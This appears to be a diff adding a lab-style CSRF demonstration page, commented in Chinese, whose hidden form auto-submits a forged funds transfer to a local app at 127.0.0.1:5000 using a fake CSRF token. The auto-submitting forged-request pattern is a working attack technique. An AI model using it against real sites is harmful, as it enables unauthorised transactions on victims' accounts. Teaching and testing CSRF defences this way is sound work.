@@ -1,0 +1,25 @@
+<!-- attack_page.html - 恶意攻击页面 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Malicious Attack Page</h1>
+    <p>This page will automatically transfer funds from the victim's account.</p>
+
+    <!-- 恶意表单，提交给目标应用 -->
+    <form action="http://127.0.0.1:5000/transfer" method="POST" id="csrf_form">
+        <!-- 伪造的转账金额 -->
+        <input type="hidden" name="amount" value="1000">  
+        <!-- 攻击者伪造的CSRF Token (没有与用户实际会话一致的token) -->
+        <input type="hidden" name="csrf_token" value="fake_csrf_token">  
+    </form>
+
+    <script type="text/javascript">
+        // 自动提交恶意表单
+        document.getElementById("csrf_form").submit();
+    </script>
+</body>
+</html>
